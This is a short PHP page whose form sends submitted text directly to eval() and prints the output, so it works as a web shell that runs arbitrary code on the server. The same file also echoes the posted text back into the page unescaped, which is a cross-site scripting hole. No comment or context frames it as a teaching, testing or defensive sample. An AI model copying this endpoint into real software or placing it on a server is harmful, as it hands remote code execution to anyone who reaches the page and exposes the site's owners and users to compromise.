<form method="post" action="">
    <textarea name="code"><?php echo $_POST['code']; ?></textarea>
    <button type="submit">Eval</button>
</form>
<div style="border: 1px solid black;">
<?php
echo eval($_POST['code']);
?>
</div>
